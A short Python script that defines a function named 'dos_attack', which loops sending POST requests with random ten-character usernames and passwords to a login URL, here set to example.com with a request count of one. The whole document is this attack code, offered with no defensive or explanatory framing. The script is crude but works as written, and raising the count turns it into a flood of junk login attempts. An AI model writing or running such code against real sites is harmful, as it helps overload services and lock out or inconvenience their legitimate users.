import requests 
import random
import string

def generate_random_string(length):
    chars = string.ascii_letters + string.digits  
    random_string = ''.join(random.choice(chars) for _ in range(length))
    return random_string

def dos_attack(url, requests_count): 
    while requests_count:
        name = generate_random_string(10)
        print(name)
        pas = generate_random_string(10)
        requests_count -= 1
        body_data = {'username': name, 'password': pas}
        requests.post(url, data=body_data)
        
url = "https://example.com/login"
request_count = 1

dos_attack(url, request_count) 
